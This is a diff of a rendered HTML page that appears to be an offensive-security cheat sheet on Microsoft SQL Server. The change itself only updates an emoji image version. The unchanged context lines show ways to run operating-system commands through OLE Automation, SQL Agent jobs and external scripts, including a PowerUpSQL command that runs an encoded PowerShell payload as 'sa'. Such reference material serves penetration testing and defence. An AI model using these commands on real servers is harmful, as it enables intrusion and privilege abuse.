@@ -7220,7 +7220,7 @@
 </code></pre></div>
 <h2 id="ole-automation">OLE Automation</h2>
 <ul>
-<li><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Disabled by default</li>
+<li><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Disabled by default</li>
 <li>The execution takes place with privileges of the <strong>service account</strong>.</li>
 </ul>
 <h3 id="execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</h3>
@@ -7247,7 +7247,7 @@
 <h2 id="agent-jobs">Agent Jobs</h2>
 <ul>
 <li>The execution takes place with privileges of the <strong>SQL Server Agent service account</strong> if a proxy account is not configured.</li>
-<li><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> Require <strong>sysadmin</strong> or <strong>SQLAgentUserRole</strong>, <strong>SQLAgentReaderRole</strong>, and <strong>SQLAgentOperatorRole</strong> roles to create a job.</li>
+<li><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Require <strong>sysadmin</strong> or <strong>SQLAgentUserRole</strong>, <strong>SQLAgentReaderRole</strong>, and <strong>SQLAgentOperatorRole</strong> roles to create a job.</li>
 </ul>
 <h3 id="execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">Invoke-SQLOSCmdAgentJob</span> <span class="n">-Subsystem</span> <span class="n">PowerShell</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password1234</span> <span class="n">-Instance</span> <span class="s2">&quot;&lt;DBSERVERNAME\DBInstance&gt;&quot;</span> <span class="n">-Command</span> <span class="s2">&quot;powershell e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
@@ -7272,7 +7272,7 @@
 <a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="nb">Get-SQLAgentJob</span> <span class="n">-Instance</span> <span class="s2">&quot;&lt;DBSERVERNAME\DBInstance&gt;&quot;</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">Password1234</span> <span class="n">-Verbose</span>
 </code></pre></div>
 <h2 id="external-scripts">External Scripts</h2>
-<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> You need to enable <strong>external scripts</strong>.</p>
+<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> You need to enable <strong>external scripts</strong>.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;external scripts enabled&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 <a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="n">RECONFIGURE</span><span class="p">;</span>
 </code></pre></div>
